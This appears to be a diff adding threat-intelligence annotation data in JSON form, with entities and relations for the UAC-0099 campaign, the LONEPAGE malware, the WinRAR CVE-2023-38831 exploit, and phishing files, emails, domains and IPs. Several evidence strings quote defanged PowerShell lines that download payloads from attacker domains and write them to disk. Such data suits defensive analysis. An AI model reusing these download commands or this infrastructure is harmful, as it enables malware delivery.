@@ -1,0 +1,186 @@
+{
+  "entities": [
+    {
+      "name": "UAC-0099",
+      "kind": "threat actor",
+      "gloss": "A threat actor known for targeting Ukrainian state organizations and conducting cyber espionage."
+    },
+    {
+      "name": "WinRAR",
+      "kind": "software product",
+      "gloss": "A popular file archiver utility for Windows."
+    },
+    {
+      "name": "CVE-2023-38831",
+      "kind": "vulnerability identifier",
+      "gloss": "A vulnerability in WinRAR allowing remote code execution via specifically crafted archive files."
+    },
+    {
+      "name": "LONEPAGE",
+      "kind": "malware family",
+      "gloss": "A malicious script and program used to execute arbitrary commands on compromised machines."
+    },
+    {
+      "name": "Cloudflare",
+      "kind": "company",
+      "gloss": "An American web infrastructure and website security company providing CDN and reverse proxy services."
+    },
+    {
+      "name": "Повід. порушення 336 КК України.rar",
+      "kind": "file",
+      "gloss": "A malicious RAR archive used in phishing campaigns."
+    },
+    {
+      "name": "Повід. порушення 336 КК України.hta",
+      "kind": "file",
+      "gloss": "A malicious HTML Application file used in phishing attacks."
+    },
+    {
+      "name": "update.win.app.com",
+      "kind": "file",
+      "gloss": "A malicious executable file deployed on target systems."
+    },
+    {
+      "name": "app.lib.conf",
+      "kind": "file",
+      "gloss": "An encrypted payload file containing PowerShell code."
+    },
+    {
+      "name": "app.lib.conf.ps1",
+      "kind": "file",
+      "gloss": "A PowerShell script component of the LONEPAGE malware."
+    },
+    {
+      "name": "316-1759-24.rar",
+      "kind": "file",
+      "gloss": "A malicious RAR archive distributed via phishing emails."
+    },
+    {
+      "name": "316-1759-24.hta",
+      "kind": "file",
+      "gloss": "A malicious HTML Application file used to compromise systems."
+    },
+    {
+      "name": "скан паспорту.rar",
+      "kind": "file",
+      "gloss": "A malicious archive file weaponized to exploit CVE-2023-38831."
+    },
+    {
+      "name": "скан паспорту.jpg .lnk",
+      "kind": "file",
+      "gloss": "A malicious LNK shortcut file used for payload delivery."
+    },
+    {
+      "name": "skan.txt",
+      "kind": "file",
+      "gloss": "A Base64-encoded payload file retrieved during infection."
+    },
+    {
+      "name": "UpdateOfficeCore.vbs",
+      "kind": "file",
+      "gloss": "A VBScript payload implementing the LONEPAGE malware functionality."
+    },
+    {
+      "name": "kiev.gp.vid2@ukr.net",
+      "kind": "email address",
+      "gloss": "An email address used in malicious email campaigns."
+    },
+    {
+      "name": "oksanakuli4@ukr.net",
+      "kind": "email address",
+      "gloss": "An email address used in malicious email campaigns."
+    },
+    {
+      "name": "gosp16.spd.ics.gov.ua@ukr.net",
+      "kind": "email address",
+      "gloss": "An email address used in malicious email campaigns."
+    },
+    {
+      "name": "captcha-challenge.com",
+      "kind": "internet domain",
+      "gloss": "A domain name used as command and control infrastructure."
+    },
+    {
+      "name": "newyorktlimes.life",
+      "kind": "internet domain",
+      "gloss": "A domain name used for payload hosting and command and control communication."
+    },
+    {
+      "name": "webappapiservice.life",
+      "kind": "internet domain",
+      "gloss": "A domain name used for command and control communication."
+    },
+    {
+      "name": "45.61.157.118",
+      "kind": "ip address",
+      "gloss": "An IP address associated with malicious threat actor infrastructure."
+    },
+    {
+      "name": "160.119.251.83",
+      "kind": "ip address",
+      "gloss": "An IP address associated with malicious threat actor infrastructure."
+    },
+    {
+      "name": "172.86.117.53",
+      "kind": "ip address",
+      "gloss": "An IP address associated with malicious threat actor infrastructure."
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0099",
+      "type": "uses-malware",
+      "tail": "LONEPAGE",
+      "evidence": "здійснюється запуск програми LONEPAGE"
+    },
+    {
+      "head": "UAC-0099",
+      "type": "exploits",
+      "tail": "CVE-2023-38831",
+      "evidence": "деякі архіви можуть містити експлойт для відомої вразливості WinRAR CVE-2023-38831"
+    },
+    {
+      "head": "CVE-2023-38831",
+      "type": "affects",
+      "tail": "WinRAR",
+      "evidence": "вразливості WinRAR CVE-2023-38831"
+    },
+    {
+      "head": "скан паспорту.rar",
+      "type": "exploits",
+      "tail": "CVE-2023-38831",
+      "evidence": "скан паспорту.rar (CVE-2023-38831)"
+    },
+    {
+      "head": "app.lib.conf.ps1",
+      "type": "part-of",
+      "tail": "LONEPAGE",
+      "evidence": "app.lib.conf.ps1 (LONEPAGE)"
+    },
+    {
+      "head": "UpdateOfficeCore.vbs",
+      "type": "part-of",
+      "tail": "LONEPAGE",
+      "evidence": "UpdateOfficeCore.vbs    (LONEPAGE)"
+    },
+    {
+      "head": "captcha-challenge.com",
+      "type": "hosts",
+      "tail": "app.lib.conf",
+      "evidence": "$a=$w.downloadstring('hXXps://captcha-challenge[.]com/Message/GetSecretNumber');[io.file]::WriteAllText('%PUBLIC%\\Libraries\\app.lib.conf',$a)"
+    },
+    {
+      "head": "newyorktlimes.life",
+      "type": "hosts",
+      "tail": "skan.txt",
+      "evidence": "$d=$w.downloadstring('hXXps://newyorktlimes[.]life/api/values/view/skan.txt')"
+    },
+    {
+      "head": "newyorktlimes.life",
+      "type": "hosts",
+      "tail": "UpdateOfficeCore.vbs",
+      "evidence": "$a=$w.downloadstring('hXXps://newyorktlimes[.]life/api/values/uid');set-content %PUBLIC%\\Documents\\UpdateOfficeCore.vbs"
+    }
+  ],
+  "newRelationTypes": []
+}
